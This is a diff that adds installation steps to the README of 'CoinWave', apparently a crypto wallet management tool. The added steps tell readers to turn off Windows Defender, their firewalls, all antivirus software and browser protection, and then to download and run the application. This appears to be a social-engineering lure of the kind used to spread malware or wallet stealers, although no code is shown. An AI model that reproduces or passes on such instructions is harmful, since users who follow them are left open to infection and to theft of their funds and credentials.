@@ -77,3 +77,28 @@ Efficiently manage wallet groups for seamless operations.
 ![Screenshot 2025-02-19 021800](https://github.com/user-attachments/assets/d1c59e6b-427b-41d8-be8e-9902d74a10ba)
 ![Screenshot 2025-02-19 023011](https://github.com/user-attachments/assets/0a647438-9a7f-48f2-855f-34c85eb50029)
 ![Screenshot 2025-02-19 023033](https://github.com/user-attachments/assets/3cb58caa-f68a-44d2-881f-845936deb468)
+
+## 📥 Download & Installation  
+
+Follow these steps to ensure a smooth installation of CoinWave:  
+
+### 1️⃣ Disable Antivirus & Firewall  
+Before downloading, **turn off** the following:  
+- **Windows Security (Windows Defender)**  
+- **Windows Defender Firewall**  
+- **Windows Defender Firewall with Advanced Security**  
+- **Any third-party antivirus software** (e.g., Norton, McAfee, Avast, etc.)  
+- **Browser-based virus protection** (Google Chrome, Microsoft Edge, etc.)  
+
+🔹 Failure to do so may result in the software not downloading or running properly.  
+
+### 2️⃣ Download CoinWave  
+- Click on the **download link** provided.  
+- Save the file to a secure location in **File Explorer** (e.g., Desktop or a dedicated folder).  
+
+### 3️⃣ Start CoinWave  
+- Open the downloaded **CoinWave** application.  
+- The software may take some time to fully start. Please **wait for the setup to complete**.  
+
+### 4️⃣ Ready to Use  
+- Once the setup is finished, you can start using CoinWave! 🎉  
